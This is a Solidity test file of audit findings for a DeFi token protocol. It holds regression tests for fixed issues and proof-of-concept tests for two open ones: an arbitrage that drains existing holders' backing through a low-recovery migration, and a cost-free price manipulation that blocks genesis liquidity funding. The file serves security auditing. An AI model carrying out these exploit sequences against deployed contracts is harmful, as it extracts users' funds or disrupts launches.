// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { PoolSwapTest } from "v4-core/test/PoolSwapTest.sol";
import { TickMath } from "v4-core/libraries/TickMath.sol";
import { IPoolManager } from "v4-core/interfaces/IPoolManager.sol";
import { PoolKey } from "v4-core/types/PoolKey.sol";
import { Currency } from "v4-core/types/Currency.sol";
import { Liquidity } from "../src/Liquidity.sol";
import { SzrCore } from "../src/SzrCore.sol";
import { InitialLiquidityTest } from "./InitialLiquidity.t.sol";

/// @dev Audit findings. `testFix_*` are regressions for fixed issues; `testPoC_*` pass while
/// the issue is still open.
/// ponytail: inherits InitialLiquidityTest for its deploy-script setUp, so its tests rerun here.
contract AuditFindingsTest is InitialLiquidityTest {
    /// H-1 (fixed part): the manager cannot withdraw or move the permanent genesis POL.
    function testFix_ManagerCannotWithdrawGenesisPol() public {
        _fundInitial();
        address operator = locker.manager();
        uint256 id = locker.INITIAL_POSITION();
        uint256 units = locker.liquidityHeld(id);
        Liquidity.Move memory move =
            Liquidity.Move(id, 0, units, 1, 0, 0, Liquidity.Bounds(0, 0, block.timestamp));

        vm.startPrank(operator);
        vm.expectRevert(Liquidity.InvalidPool.selector);
        locker.withdrawPrincipal(id, units, 0, 0, block.timestamp);
        vm.expectRevert(Liquidity.InvalidPool.selector);
        locker.moveLiquidity(move);
        vm.stopPrank();

        assertEq(locker.liquidityHeld(id), units);
        locker.collect(id); // fees still collectable
    }

    /// M-2 (fixed): backing cannot be donated while no one holds a claim on it.
    function testFix_DonationAtZeroSupplyReverts() public {
        address donor = address(0xD0);
        backing.mint(donor, 100e18);
        vm.startPrank(donor);
        backing.approve(address(core), 100e18);
        vm.expectRevert(SzrCore.NoActiveSupply.selector);
        core.donateBacking(100e18);
        vm.stopPrank();

        _migrateContributor();
        vm.prank(donor);
        core.donateBacking(100e18);
        assertGe(core.reserveCash(), 100e18);
    }

    /// H-2 (open): a low-recovery migration lowers NAV for existing holders, and an arbitrageur
    /// who migrates cheap legacy SZR and redeems immediately leaves with more WETH than it brought.
    function testPoC_MigrationLowersFloorAndArbitrageExtractsFromHolders() public {
        vm.prank(alice);
        migrator.migrate(1_000_000e18, 0, block.timestamp);
        uint256 navBefore = core.NAV();

        oldHook.setPrice(3e11); // legacy recovery 10x lower (band drained / legacy price fell)
        address arb = address(0xA4B);
        oldToken.mint(arb, 1_000_000e18);
        vm.startPrank(arb);
        oldToken.approve(address(migrator), type(uint256).max);
        uint256 brought = migrator.migrate(1_000_000e18, 0, block.timestamp);
        core.token().approve(address(core), type(uint256).max);
        uint256 taken = core.redeem(1_000_000e18, 0);
        vm.stopPrank();

        assertLt(core.NAV(), navBefore * 60 / 100); // alice's floor fell >40%
        assertGt(taken, brought * 5); // arb extracted alice's backing
    }

    /// M-1 (open): before genesis is funded the pool is empty, so anyone can move its price into
    /// the genesis range for free; fundInitialLiquidity then reverts until someone moves it back.
    function testPoC_AnyoneBlocksGenesisFundingForFree() public {
        _migrateContributor();
        uint256 id = locker.INITIAL_POSITION();
        PoolKey memory key = locker.key(id);
        Liquidity.Position memory g = locker.position(id);
        bool szrFirst = Currency.unwrap(key.currency0) == address(core.token());
        uint160 target =
            TickMath.getSqrtPriceAtTick(szrFirst ? g.tickLower + 600 : g.tickUpper - 600);

        PoolSwapTest router = new PoolSwapTest(manager);
        address griefer = address(0x6121);
        backing.mint(griefer, 1e18);
        vm.startPrank(griefer);
        backing.approve(address(router), type(uint256).max);
        PoolSwapTest.TestSettings memory settings;
        router.swap(key, IPoolManager.SwapParams(!szrFirst, -1e18, target), settings, "");
        vm.stopPrank();
        assertEq(backing.balanceOf(griefer), 1e18); // cost nothing

        vm.prank(contributor);
        vm.expectRevert(Liquidity.AboveMaximum.selector);
        locker.fundInitialLiquidity(1, block.timestamp);

        // Recoverable: anyone can swap the empty pool back for free, then funding succeeds.
        uint160 restore =
            TickMath.getSqrtPriceAtTick(szrFirst ? g.tickLower - 600 : g.tickUpper + 600);
        router.swap(key, IPoolManager.SwapParams(szrFirst, -1e18, restore), settings, "");
        vm.prank(contributor);
        assertGt(locker.fundInitialLiquidity(1, block.timestamp), 0);
    }
}
